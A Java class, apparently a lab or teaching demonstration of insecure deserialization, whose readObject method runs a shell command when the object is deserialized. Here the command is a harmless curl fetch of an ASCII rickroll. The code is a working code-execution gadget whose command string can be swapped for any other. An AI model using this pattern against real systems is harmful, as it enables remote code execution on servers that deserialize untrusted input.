package exploit;

import model.Task;

import java.io.IOException;
import java.io.ObjectInputStream;

public class MaliciousPayload implements Task {

    @Override
    public void execute() {
        System.out.println("Hahaha, you are a victim of insecure deserialization.");
    }

    @Override
    public void setParam(Object param) {
    }

    private void readObject(ObjectInputStream ois)
            throws IOException, ClassNotFoundException {

        ois.defaultReadObject();

        System.out.println("Exploit triggered during deserialization!");
        ProcessBuilder pb = new ProcessBuilder("sh", "-c", "curl -L ascii.live/rick");


        pb.inheritIO();

        try {
            Process process = pb.start();

            int exitCode = process.waitFor();
            System.out.println("Exited with code: " + exitCode);
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }
}
